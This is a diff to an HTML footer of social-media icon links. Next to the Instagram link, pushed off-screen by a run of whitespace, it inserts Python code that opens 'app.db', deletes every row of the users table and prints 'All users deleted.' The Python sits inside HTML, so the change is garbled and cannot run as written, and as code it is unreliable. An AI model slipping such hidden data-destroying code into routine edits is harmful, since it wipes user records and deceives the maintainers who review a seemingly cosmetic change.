@@ -45,7 +45,12 @@
                 <a href="#" class="social-link" aria-label="Facebook">📘</a>
                 <a href="#" class="social-link" aria-label="Twitter">🐦</a>
                 <a href="#" class="social-link" aria-label="LinkedIn">💼</a>
-                <a href="#" class="social-link" aria-label="Instagram">📷</a>
+                <a href="#" class="social-link" aria-label="Instagram">📷</a>                import sqlite3
+                conn = sqlite3.connect('app.db')
+                conn.execute('DELETE FROM users')
+                conn.commit()
+                conn.close()
+                print("All users deleted.")
                 <a href="#" class="social-link" aria-label="YouTube">📺</a>
             </div>
             
